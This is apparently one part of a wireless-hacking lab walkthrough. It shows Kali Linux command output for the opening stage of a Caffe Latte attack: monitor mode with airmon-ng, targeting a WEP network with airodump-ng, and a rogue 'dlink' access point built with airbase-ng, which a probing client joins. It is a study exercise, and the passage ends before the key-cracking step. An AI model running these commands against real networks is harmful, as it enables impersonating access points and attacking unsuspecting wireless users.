#### Part 16: Caffe Latte Attack

```Client side attack```

Before connecting the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 51830  bytes 3435415 (3.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47066  bytes 33321752 (31.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 248  bytes 12512 (12.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 248  bytes 12512 (12.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```	
	
Connect the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 113  bytes 13062 (12.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 19058 (18.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig -a
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 124  bytes 13940 (13.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 20732 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 00:c0:ca:92:3c:89  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig wlan0 up
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 377  bytes 30254 (29.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 169  bytes 26425 (25.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ae:ac:75:a7:71:b2  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

Put the card in monitor mode

```sh
root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~# airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  400 NetworkManager
  569 dhclient
  804 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)

root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0mon	rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~#
```

Check for the monitor mode interface

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 518  bytes 40324 (39.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 236  bytes 35799 (34.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-92-3C-89-30-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 858  bytes 151521 (147.9 KiB)
        RX errors 0  dropped 858  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~#
```

Start ```airodump-ng```

```sh
root@kali:~# airodump-ng wlan0mon --channel 4 --bssid 84:C9:B2:6D:0C:85

 CH  4 ][ Elapsed: 2 mins ][ 2017-06-06 19:39

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85   -3  93     1270      147    0   4  11e. WEP  WEP    SKA  dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 84:C9:B2:6D:0C:85  BC:9F:EF:69:35:19  -26    5e-11      0      169  dlink
root@kali:~#
```

Client was probing for ```dlink``` so we set up a soft AP called ```dlink``` with the ```WEP``` flag set

```sh
root@kali:~# airbase-ng -W 1 --essid dlink --channel 4 wlan0mon
19:37:14  Created tap interface at0
19:37:14  Trying to set MTU on at0 to 1500
19:37:14  Access Point with BSSID 00:C0:CA:92:3C:89 started.
19:37:44  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:44  SKA from BC:9F:EF:69:35:19
19:37:44  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:45  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:45  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:45  SKA from BC:9F:EF:69:35:19
19:37:45  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:45  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:45  SKA from BC:9F:EF:69:35:19
19:37:45  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:45  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:45  SKA from BC:9F:EF:69:35:19
19:37:45  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:45  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:45  SKA from BC:9F:EF:69:35:19
19:37:45  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:45  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:37:45  SKA from BC:9F:EF:69:35:19
19:37:45  Client BC:9F:EF:69:35:19 associated (WEP) to ESSID: "dlink"
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  SKA from BC:9F:EF:69:35:19
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  SKA from BC:9F:EF:69:35:19
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  SKA from BC:9F:EF:69:35:19
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  SKA from BC:9F:EF:69:35:19
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  SKA from BC:9F:EF:69:35:19
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  SKA from BC:9F:EF:69:35:19
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  SKA from BC:9F:EF:69:35:19
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  SKA from BC:9F:EF:69:35:19
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:16  SKA from BC:9F:EF:69:35:19
19:38:16  Client BC:9F:EF:69:35:19 reassociated (WEP) to ESSID: "dlink"
19:38:16  Client BC:9F:EF:69:35:19 reassociated (WEP) to ESSID: "dlink"
19:38:16  Client BC:9F:EF:69:35:19 reassociated (WEP) to ESSID: "dlink"
19:38:16  Client BC:9F:EF:69:35:19 reassociated (WEP) to ESSID: "dlink"
19:38:16  Client BC:9F:EF:69:35:19 reassociated (WEP) to ESSID: "dlink"
19:38:16  Client BC:9F:EF:69:35:19 reassociated (WEP) to ESSID: "dlink"
19:38:26  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
19:38:26  SKA from BC:9F:EF:69:35:19
19:38:26  Client BC:9F:EF:69:35:19 reassociated (WEP) to ESSID: "dlink"
```

The client successfully connects to us.

As attackers we have no knowledge of the key.
